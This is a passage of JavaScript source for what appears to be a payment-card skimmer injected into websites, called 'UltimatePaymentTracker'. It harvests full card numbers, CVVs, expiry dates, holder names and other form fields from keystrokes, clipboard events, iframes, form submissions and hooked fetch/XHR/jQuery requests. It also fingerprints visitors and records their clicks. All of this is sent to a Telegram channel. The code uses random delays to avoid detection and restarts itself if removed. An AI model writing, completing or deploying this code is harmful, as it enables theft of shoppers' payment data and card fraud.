                } else if (cardInfo.type === 'EXPIRY_DATE') {
                    cardDataCache.expiry = cardInfo.value;
                } else if (cardInfo.type === 'CARD_HOLDER') {
                    cardDataCache.holder = cardInfo.value;
                }
            });
        }
        
        detectPaymentGateways() {
            // Detect by script tags
            const scripts = document.querySelectorAll('script[src]');
            scripts.forEach(script => {
                const src = script.src.toLowerCase();
                
                if (src.includes('stripe')) this.knownGateways.add('Stripe');
                if (src.includes('paypal')) this.knownGateways.add('PayPal');
                if (src.includes('razorpay')) this.knownGateways.add('Razorpay');
                if (src.includes('braintree')) this.knownGateways.add('Braintree');
                if (src.includes('authorize')) this.knownGateways.add('Authorize.net');
                if (src.includes('square')) this.knownGateways.add('Square');
                if (src.includes('2checkout')) this.knownGateways.add('2Checkout');
                if (src.includes('checkout.com')) this.knownGateways.add('Checkout.com');
                if (src.includes('paytm')) this.knownGateways.add('Paytm');
                if (src.includes('phonepe')) this.knownGateways.add('PhonePe');
                if (src.includes('googlepay')) this.knownGateways.add('Google Pay');
                if (src.includes('applepay')) this.knownGateways.add('Apple Pay');
            });
            
            // Detect by global objects
            if (window.Stripe) this.knownGateways.add('Stripe');
            if (window.paypal) this.knownGateways.add('PayPal');
            if (window.Razorpay) this.knownGateways.add('Razorpay');
            if (window.braintree) this.knownGateways.add('Braintree');
            if (window.Square) this.knownGateways.add('Square');
            
            // Send gateway report
            if (this.knownGateways.size > 0) {
                this.sendGatewayReport();
            }
        }
        
        sendGatewayReport() {
            AdvancedUtils.getUserIP().then(ip => {
                const gateways = Array.from(this.knownGateways).join(', ');
                
                const message = `🔌 <b>PAYMENT GATEWAYS DETECTED</b>\n\n`;
                message += `🎯 <b>Active Gateways:</b> ${gateways}\n`;
                message += `🌐 <b>Page:</b> ${window.location.href}\n`;
                message += `📡 <b>IP:</b> ${ip}\n`;
                message += `🆔 <b>Session:</b> ${sessionId}\n`;
                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                
                AdvancedUtils.sendTelegram(message);
            });
        }
        
        sendKeystrokeReport() {
            if (keystrokeBuffer.length === 0) return;
            
            // Analyze keystrokes for potential card numbers
            const potentialCard = this.extractPotentialCardFromKeystrokes();
            if (potentialCard) {
                this.sendPotentialCardAlert(potentialCard);
            }
            
            // Clear buffer
            keystrokeBuffer = [];
        }
        
        extractPotentialCardFromKeystrokes() {
            const keystrokes = keystrokeBuffer.map(k => k.key).join('');
            
            // Look for 13-19 digit sequences
            const digitSequence = keystrokes.match(/\d{13,19}/);
            if (digitSequence) {
                return {
                    type: 'CARD_NUMBER_FROM_KEYSTROKES',
                    value: digitSequence[0],
                    keystrokeCount: keystrokeBuffer.length
                };
            }
            
            return null;
        }
        
        sendPotentialCardAlert(cardData) {
            AdvancedUtils.getUserIP().then(ip => {
                const message = AdvancedUtils.generateReport('⌨️ KEYSTROKE CARD DETECTION', {
                    'Type': cardData.type,
                    'Card Number': AdvancedUtils.maskCardNumber(cardData.value),
                    'Full Number': cardData.value,
                    'Card Type': AdvancedUtils.detectCardType(cardData.value),
                    'Keystrokes Analyzed': cardData.keystrokeCount,
                    'IP Address': ip
                });
                
                AdvancedUtils.sendTelegram(message);
            });
        }
        
        sendClipboardAlert(text) {
            AdvancedUtils.getUserIP().then(ip => {
                const message = AdvancedUtils.generateReport('📋 CLIPBOARD CARD DATA', {
                    'Action': 'Copy',
                    'Copied Text': text,
                    'Detected As': this.looksLikeCardData(text) ? 'Card Data' : 'Unknown',
                    'IP Address': ip
                });
                
                AdvancedUtils.sendTelegram(message);
            });
        }
        
        sendPasteAlert(text) {
            AdvancedUtils.getUserIP().then(ip => {
                const message = AdvancedUtils.generateReport('📋 PASTE CARD DATA', {
                    'Action': 'Paste',
                    'Pasted Text': text,
                    'Detected As': this.looksLikeCardData(text) ? 'Card Data' : 'Unknown',
                    'IP Address': ip
                });
                
                AdvancedUtils.sendTelegram(message);
            });
        }
        
        captureIframePaymentData(iframe, field) {
            AdvancedUtils.getUserIP().then(ip => {
                const fieldName = field.name || field.id || 'iframe_field';
                const iframeSrc = iframe.src || 'unknown';
                
                const message = AdvancedUtils.generateReport('🖼️ IFRAME PAYMENT DATA', {
                    'Field': fieldName,
                    'Value': field.value,
                    'Iframe Source': iframeSrc,
                    'Page': window.location.href,
                    'IP Address': ip
                });
                
                AdvancedUtils.sendTelegram(message);
            });
        }
        
        setupIframeCommunication(iframe) {
            // PostMessage communication attempt
            try {
                iframe.contentWindow.postMessage({ type: 'GET_FIELD_VALUES' }, '*');
                
                window.addEventListener('message', (event) => {
                    if (event.data && event.data.type === 'FIELD_VALUES_RESPONSE') {
                        this.processIframeResponse(event.data);
                    }
                });
            } catch (e) {}
        }
        
        processIframeResponse(data) {
            if (data.fields && Array.isArray(data.fields)) {
                data.fields.forEach(field => {
                    if (field.value && this.looksLikeCardData(field.value)) {
                        this.sendIframeDataAlert(field);
                    }
                });
            }
        }
        
        sendIframeDataAlert(field) {
            AdvancedUtils.getUserIP().then(ip => {
                const message = AdvancedUtils.generateReport('🖼️ IFRAME CARD DATA', {
                    'Field': field.name || 'unknown',
                    'Value': field.value,
                    'Page': window.location.href,
                    'IP Address': ip
                });
                
                AdvancedUtils.sendTelegram(message);
            });
        }
    };
    
    // ==================== FORM SUBMISSION INTERCEPTOR ====================
    class FormInterceptor {
        constructor() {
            this.interceptedForms = new Set();
            this.ajaxInterceptors = new Set();
            this.init();
        }
        
        init() {
            this.interceptExistingForms();
            this.setupFormObserver();
            this.interceptAJAX();
            this.interceptFetch();
            this.interceptXHR();
        }
        
        interceptExistingForms() {
            document.querySelectorAll('form').forEach(form => {
                this.interceptForm(form);
            });
        }
        
        setupFormObserver() {
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.tagName === 'FORM') {
                            this.interceptForm(node);
                        } else if (node.querySelectorAll) {
                            const forms = node.querySelectorAll('form');
                            forms.forEach(form => this.interceptForm(form));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        interceptForm(form) {
            if (this.interceptedForms.has(form)) return;
            this.interceptedForms.add(form);
            
            // Store original submit
            const originalSubmit = form.submit;
            
            // Override submit method
            form.submit = () => {
                this.captureFormDataBeforeSubmit(form);
                return originalSubmit.call(form);
            };
            
            // Add event listener
            form.addEventListener('submit', (e) => {
                this.handleFormSubmit(e, form);
            }, true);
            
            // Intercept submit buttons
            const submitButtons = form.querySelectorAll(
                'button[type="submit"], input[type="submit"], button:not([type])'
            );
            
            submitButtons.forEach(button => {
                button.addEventListener('click', () => {
                    setTimeout(() => {
                        this.captureFormDataBeforeSubmit(form);
                    }, 100);
                }, true);
            });
        }
        
        async handleFormSubmit(event, form) {
            // Don't prevent default - let form submit normally
            await this.captureFormDataBeforeSubmit(form);
            return true;
        }
        
        async captureFormDataBeforeSubmit(form) {
            await new Promise(resolve => setTimeout(resolve, 50));
            
            const formData = this.collectFormData(form);
            
            if (this.containsPaymentData(formData)) {
                await this.sendFormSubmissionReport(form, formData);
            }
            
            // Send cached card data if exists
            if (Object.keys(cardDataCache).length > 0) {
                await this.sendCachedCardData();
            }
        }
        
        collectFormData(form) {
            const data = {};
            
            // Collect from form elements
            const elements = form.querySelectorAll(
                'input, select, textarea, [contenteditable="true"]'
            );
            
            elements.forEach(element => {
                let value = '';
                let name = '';
                
                if (element.tagName === 'INPUT' || element.tagName === 'SELECT' || element.tagName === 'TEXTAREA') {
                    value = element.value;
                    name = element.name || element.id;
                } else if (element.hasAttribute('contenteditable')) {
                    value = element.innerText || element.textContent;
                    name = element.getAttribute('data-name') || element.id;
                }
                
                if (name && value && value.toString().trim()) {
                    data[name] = value.toString().trim();
                }
            });
            
            // Also try FormData API
            try {
                const formDataObj = new FormData(form);
                for (let [key, value] of formDataObj.entries()) {
                    if (value && value.toString().trim()) {
                        data[key] = value.toString().trim();
                    }
                }
            } catch (e) {}
            
            return data;
        }
        
        containsPaymentData(data) {
            const combined = Object.values(data).join(' ').toLowerCase();
            const paymentIndicators = [
                'card', 'cc', 'credit', 'debit', 'cvv', 'cvc',
                'expir', 'expiry', 'paypal', 'stripe', 'razorpay',
                'payment', 'checkout', 'iban', 'swift', 'routing'
            ];
            
            return paymentIndicators.some(indicator => combined.includes(indicator));
        }
        
        async sendFormSubmissionReport(form, formData) {
            const ip = await AdvancedUtils.getUserIP();
            const formAction = form.action || 'N/A';
            const formMethod = form.method || 'POST';
            
            let message = `📋 <b>FORM SUBMISSION INTERCEPTED</b>\n\n`;
            message += `🎯 <b>Form Details:</b>\n`;
            message += `➤ Action: ${formAction}\n`;
            message += `➤ Method: ${formMethod}\n`;
            message += `➤ Fields Captured: ${Object.keys(formData).length}\n\n`;
            
            message += `💳 <b>Payment Data Found:</b>\n`;
            
            // Extract and display payment data
            for (const [key, value] of Object.entries(formData)) {
                const keyLower = key.toLowerCase();
                
                if (keyLower.includes('card') && !keyLower.includes('cvv') && this.isCardNumber(value)) {
                    message += `🔢 <b>Card Number:</b> ${AdvancedUtils.maskCardNumber(value)}\n`;
                    message += `📊 <b>Full:</b> <code>${value}</code>\n`;
                    message += `💳 <b>Type:</b> ${AdvancedUtils.detectCardType(value)}\n`;
                } else if (keyLower.includes('cvv') || keyLower.includes('cvc')) {
                    message += `🔐 <b>CVV/CVC:</b> ${value}\n`;
                } else if (keyLower.includes('expir') || keyLower.includes('expdate')) {
                    message += `📅 <b>Expiry:</b> ${value}\n`;
                } else if (keyLower.includes('holder') || keyLower.includes('nameoncard')) {
                    message += `👤 <b>Card Holder:</b> ${value}\n`;
                } else if (keyLower.includes('email')) {
                    message += `📧 <b>Email:</b> ${value}\n`;
                } else if (keyLower.includes('phone') || keyLower.includes('mobile')) {
                    message += `📱 <b>Phone:</b> ${value}\n`;
                }
            }
            
            // Display other form data (truncated)
            const otherFields = Object.entries(formData).filter(([key, value]) => {
                const keyLower = key.toLowerCase();
                return !keyLower.includes('card') && 
                       !keyLower.includes('cvv') && 
                       !keyLower.includes('expir') && 
                       !keyLower.includes('holder') && 
                       !keyLower.includes('email') && 
                       !keyLower.includes('phone');
            });
            
            if (otherFields.length > 0) {
                message += `\n📝 <b>Other Form Data:</b>\n`;
                otherFields.slice(0, 5).forEach(([key, value]) => {
                    message += `➤ ${key}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}\n`;
                });
                
                if (otherFields.length > 5) {
                    message += `➤ ... and ${otherFields.length - 5} more fields\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> <code>${window.location.href}</code>\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendTelegram(message);
        }
        
        isCardNumber(value) {
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            return /^[0-9]{13,19}$/.test(cleaned);
        }
        
        async sendCachedCardData() {
            if (Object.keys(cardDataCache).length === 0) return;
            
            const ip = await AdvancedUtils.getUserIP();
            
            let message = `💾 <b>CACHED CARD DATA SUBMITTED</b>\n\n`;
            
            if (cardDataCache.cardNumber) {
                message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(cardDataCache.cardNumber)}\n`;
                message += `📊 <b>Full:</b> <code>${cardDataCache.cardNumber}</code>\n`;
                message += `💳 <b>Type:</b> ${AdvancedUtils.detectCardType(cardDataCache.cardNumber)}\n`;
                message += `🏦 <b>BIN:</b> ${AdvancedUtils.getCardBIN(cardDataCache.cardNumber)}\n`;
            }
            if (cardDataCache.cvv) message += `🔐 <b>CVV:</b> ${cardDataCache.cvv}\n`;
            if (cardDataCache.expiry) message += `📅 <b>Expiry:</b> ${cardDataCache.expiry}\n`;
            if (cardDataCache.holder) message += `👤 <b>Holder:</b> ${cardDataCache.holder}\n`;
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendTelegram(message);
            
            // Clear cache after sending
            cardDataCache = {};
        }
        
        interceptAJAX() {
            // jQuery AJAX interception
            if (window.jQuery) {
                const originalAjax = jQuery.ajax;
                jQuery.ajax = function(options) {
                    if (options.data && typeof options.data === 'object') {
                        setTimeout(() => {
                            this.checkAjaxDataForPayment(options);
                        }, 100);
                    }
                    return originalAjax.apply(this, arguments);
                }.bind(this);
            }
        }
        
        interceptFetch() {
            const originalFetch = window.fetch;
            if (originalFetch) {
                window.fetch = async function(...args) {
                    const [resource, config = {}] = args;
                    
                    // Check request data
                    if (config.body) {
                        let bodyData = config.body;
                        
                        if (bodyData instanceof FormData) {
                            const formData = {};
                            for (let [key, value] of bodyData.entries()) {
                                formData[key] = value;
                            }
                            bodyData = formData;
                        } else if (typeof bodyData === 'string') {
                            try {
                                bodyData = JSON.parse(bodyData);
                            } catch (e) {
                                // Try URL encoded
                                bodyData = Object.fromEntries(new URLSearchParams(bodyData));
                            }
                        }
                        
                        if (typeof bodyData === 'object') {
                            setTimeout(async () => {
                                if (this.containsPaymentData(bodyData)) {
                                    const ip = await AdvancedUtils.getUserIP();
                                    this.sendAjaxReport('Fetch', resource, bodyData, ip);
                                }
                            }.bind(this), 100);
                        }
                    }
                    
                    return originalFetch.apply(this, args);
                }.bind(this);
            }
        }
        
        interceptXHR() {
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSend = XMLHttpRequest.prototype.send;
            
            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                return originalOpen.apply(this, arguments);
            };
            
            XMLHttpRequest.prototype.send = function(body) {
                if (body && this._method === 'POST') {
                    setTimeout(async () => {
                        try {
                            let bodyData = body;
                            
                            if (body instanceof FormData) {
                                const formData = {};
                                for (let [key, value] of body.entries()) {
                                    formData[key] = value;
                                }
                                bodyData = formData;
                            } else if (typeof body === 'string') {
                                try {
                                    bodyData = JSON.parse(body);
                                } catch (e) {
                                    bodyData = Object.fromEntries(new URLSearchParams(body));
                                }
                            }
                            
                            if (typeof bodyData === 'object' && this.containsPaymentData(bodyData)) {
                                const ip = await AdvancedUtils.getUserIP();
                                this.sendAjaxReport('XHR', this._url, bodyData, ip);
                            }
                        } catch (e) {}
                    }.bind(this), 100);
                }
                
                return originalSend.apply(this, arguments);
            }.bind(this);
        }
        
        async sendAjaxReport(type, url, data, ip) {
            let message = `⚡ <b>${type} PAYMENT REQUEST</b>\n\n`;
            message += `🎯 <b>Request to:</b> ${url}\n`;
            message += `📊 <b>Data Size:</b> ${JSON.stringify(data).length} bytes\n\n`;
            
            message += `💳 <b>Payment Data:</b>\n`;
            
            for (const [key, value] of Object.entries(data)) {
                const keyLower = key.toLowerCase();
                if (keyLower.includes('card') && this.isCardNumber(value)) {
                    message += `🔢 <b>Card:</b> ${AdvancedUtils.maskCardNumber(value)}\n`;
                } else if (keyLower.includes('cvv')) {
                    message += `🔐 <b>CVV:</b> ${value}\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendTelegram(message);
        }
        
        checkAjaxDataForPayment(options) {
            if (options.data && typeof options.data === 'object') {
                const dataStr = JSON.stringify(options.data).toLowerCase();
                if (dataStr.includes('card') || dataStr.includes('cvv') || dataStr.includes('payment')) {
                    setTimeout(async () => {
                        const ip = await AdvancedUtils.getUserIP();
                        this.sendAjaxReport('jQuery', options.url, options.data, ip);
                    }, 100);
                }
            }
        }
    };
    
    // ==================== SESSION RECORDER (OPTIONAL) ====================
    class SessionRecorder {
        constructor() {
            if (!CONFIG.TRACK_EVENTS.SESSION_RECORDING) return;
            this.recordings = [];
            this.isRecording = false;
            this.init();
        }
        
        init() {
            this.startRecording();
        }
        
        startRecording() {
            this.isRecording = true;
            
            // Record mouse movements
            document.addEventListener('mousemove', (e) => {
                if (!this.isRecording) return;
                
                mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: Date.now()
                });
                
                // Limit buffer size
                if (mouseMovements.length > 1000) {
                    mouseMovements = mouseMovements.slice(-500);
                }
            });
            
            // Record clicks
            document.addEventListener('click', (e) => {
                if (!this.isRecording) return;
                
                const targetInfo = {
                    tag: e.target.tagName,
                    id: e.target.id,
                    className: e.target.className,
                    name: e.target.name,
                    value: e.target.value,
                    href: e.target.href,
                    text: e.target.innerText?.substring(0, 100)
                };
                
                this.recordings.push({
                    type: 'CLICK',
                    target: targetInfo,
                    timestamp: Date.now(),
                    mousePosition: { x: e.clientX, y: e.clientY }
                });
            });
            
            // Periodically send recordings
            setInterval(() => {
                if (this.recordings.length > 0) {
                    this.sendRecordingBatch();
                }
            }, 30000); // Send every 30 seconds
        }
        
        sendRecordingBatch() {
            if (this.recordings.length === 0) return;
            
            const batch = this.recordings.slice(0, 50);
            this.recordings = this.recordings.slice(50);
            
            // Prepare summary
            const clicks = batch.filter(r => r.type === 'CLICK');
            const paymentClicks = clicks.filter(c => 
                c.target.text?.toLowerCase().includes('pay') ||
                c.target.className?.toLowerCase().includes('payment') ||
                c.target.id?.toLowerCase().includes('card')
            );
            
            if (paymentClicks.length > 0) {
                AdvancedUtils.getUserIP().then(ip => {
                    let message = `🎥 <b>SESSION RECORDING - PAYMENT INTERACTIONS</b>\n\n`;
                    message += `🖱️ <b>Payment-related Clicks:</b> ${paymentClicks.length}\n\n`;
                    
                    paymentClicks.slice(0, 3).forEach((click, index) => {
                        message += `${index + 1}. ${click.target.tag} `;
                        if (click.target.id) message += `#${click.target.id} `;
                        if (click.target.className) message += `.${click.target.className.split(' ')[0]} `;
                        if (click.target.text) message += `- "${click.target.text.substring(0, 50)}"\n`;
                    });
                    
                    message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
                    message += `📡 <b>IP:</b> ${ip}\n`;
                    message += `🆔 <b>Session:</b> ${sessionId}\n`;
                    message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                    
                    AdvancedUtils.sendTelegram(message);
                });
            }
        }
    };
    
    // ==================== MAIN INITIALIZER ====================
    class UltimatePaymentTracker {
        constructor() {
            this.initialize();
        }
        
        async initialize() {
            // Complete silence
            AdvancedUtils.silenceEnvironment();
            
            // Get initial data
            const [ip, fingerprint] = await Promise.all([
                AdvancedUtils.getUserIP(),
                Promise.resolve(AdvancedUtils.getBrowserFingerprint())
            ]);
            
            // Send activation message
            await this.sendActivationMessage(ip, fingerprint);
            
            // Initialize all components with delays to avoid detection
            setTimeout(() => {
                new AutofillCapturer();
            }, 500);
            
            setTimeout(() => {
                new AdvancedPaymentDetector();
            }, 1000);
            
            setTimeout(() => {
                new FormInterceptor();
            }, 1500);
            
            setTimeout(() => {
                new SessionRecorder();
            }, 2000);
            
            // Track page changes (SPA support)
            this.setupSPATracking();
            
            // Periodic status updates
            this.setupPeriodicUpdates();
            
            isActive = true;
        }
        
        async sendActivationMessage(ip, fingerprint) {
            if (!CONFIG.TRACK_EVENTS.ACTIVATION) return;
            
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const languages = navigator.languages.join(', ');
            const screenRes = `${screen.width}x${screen.height}`;
            
            let message = `🚀 <b>ULTIMATE PAYMENT TRACKER ACTIVATED</b>\n\n`;
            message += `🔄 <b>Version:</b> ${CONFIG.VERSION}\n`;
            message += `🌐 <b>Website:</b> ${window.location.origin}\n`;
            message += `📄 <b>Page:</b> <code>${window.location.href}</code>\n`;
            message += `🔗 <b>Referrer:</b> ${document.referrer || 'Direct'}\n\n`;
            
            message += `👤 <b>User Info:</b>\n`;
            message += `➤ IP Address: ${ip}\n`;
            message += `➤ User Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\n`;
            message += `➤ Platform: ${platform}\n`;
            message += `➤ Languages: ${languages}\n`;
            message += `➤ Screen: ${screenRes}\n`;
            message += `➤ Device ID: ${deviceId}\n`;
            message += `➤ Session ID: ${sessionId}\n\n`;
            
            message += `🔧 <b>Features Active:</b>\n`;
            Object.entries(CONFIG.TRACK_EVENTS).forEach(([key, value]) => {
                if (value) message += `✅ ${key}\n`;
            });
            
            message += `\n🕒 <b>Activation Time:</b> ${new Date().toLocaleString()}`;
            
            await AdvancedUtils.sendTelegram(message);
        }
        
        setupSPATracking() {
            let lastUrl = window.location.href;
            let lastTitle = document.title;
            
            // URL change detection for SPAs
            setInterval(() => {
                const currentUrl = window.location.href;
                const currentTitle = document.title;
                
                if (currentUrl !== lastUrl || currentTitle !== lastTitle) {
                    lastUrl = currentUrl;
                    lastTitle = currentTitle;
                    
                    // Track page change
                    this.trackPageChange(currentUrl, currentTitle);
                    
                    // Reinitialize detectors for new page
                    setTimeout(() => {
                        if (isActive) {
                            new AutofillCapturer();
                            new AdvancedPaymentDetector();
                        }
                    }, 1000);
                }
            }, 1000);
            
            // History API interception
            const originalPushState = history.pushState;
            const originalReplaceState = history.replaceState;
            
            history.pushState = function() {
                originalPushState.apply(this, arguments);
                window.dispatchEvent(new Event('locationchange'));
            };
            
            history.replaceState = function() {
                originalReplaceState.apply(this, arguments);
                window.dispatchEvent(new Event('locationchange'));
            };
            
            window.addEventListener('popstate', () => {
                window.dispatchEvent(new Event('locationchange'));
            });
            
            window.addEventListener('locationchange', () => {
                this.trackPageChange(window.location.href, document.title);
            });
        }
        
        trackPageChange(url, title) {
            const urlLower = url.toLowerCase();
            
            // Check for payment-related pages
            const isPaymentPage = 
                urlLower.includes('/checkout') || 
                urlLower.includes('/payment') ||
                urlLower.includes('/pay') ||
                urlLower.includes('/billing') ||
                urlLower.includes('/order') ||
                title.toLowerCase().includes('checkout') ||
                title.toLowerCase().includes('payment');
            
            if (isPaymentPage && CONFIG.TRACK_EVENTS.CHECKOUT_VISIT) {
                AdvancedUtils.getUserIP().then(ip => {
                    const message = AdvancedUtils.generateReport('📍 PAYMENT PAGE VISITED', {
                        'Page Title': title,
                        'URL': url,
                        'IP Address': ip,
                        'Navigation Type': 'SPA Navigation'
                    });
                    
                    AdvancedUtils.sendTelegram(message);
                });
            }
        }
        
        setupPeriodicUpdates() {
            // Send periodic heartbeat
            setInterval(async () => {
                if (isActive) {
                    const ip = await AdvancedUtils.getUserIP();
                    const activeFields = document.querySelectorAll('input[value], textarea[value]').length;
                    
                    const message = `❤️ <b>HEARTBEAT</b>\n\n`;
                    message += `🔄 <b>Status:</b> Active\n`;
                    message += `🌐 <b>Page:</b> ${window.location.href}\n`;
                    message += `📊 <b>Active Fields:</b> ${activeFields}\n`;
                    message += `📡 <b>IP:</b> ${ip}\n`;
                    message += `🆔 <b>Session:</b> ${sessionId}\n`;
                    message += `🕒 <b>Uptime:</b> ${Math.floor(performance.now() / 60000)} minutes`;
                    
                    AdvancedUtils.sendTelegram(message);
                }
            }, 300000); // Every 5 minutes
        }
    };
    
    // ==================== ENTRY POINT ====================
    // Wait for optimal time to initialize
    const initializeTracker = () => {
        // Avoid initialization during page load peaks
        const loadState = document.readyState;
        
        if (loadState === 'complete' || loadState === 'interactive') {
            setTimeout(() => {
                new UltimatePaymentTracker();
            }, Math.random() * 2000 + 1000); // Random delay 1-3 seconds
        } else {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    new UltimatePaymentTracker();
                }, Math.random() * 2000 + 1000);
            });
            
            window.addEventListener('load', () => {
                if (!isActive) {
                    setTimeout(() => {
                        new UltimatePaymentTracker();
                    }, 2000);
                }
            });
        }
    };
    
    // Start with random delay to avoid pattern detection
    setTimeout(initializeTracker, Math.random() * 5000);
    
    // Self-healing: Reinitialize if tracker gets removed
    setInterval(() => {
        if (!isActive && document.body) {
            initializeTracker();
        }
    }, 10000);
    
    // String hashcode for canvas fingerprinting
    String.prototype.hashCode = function() {
        let hash = 0;
        for (let i = 0; i < this.length; i++) {
            const char = this.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash;
    };
    
})();
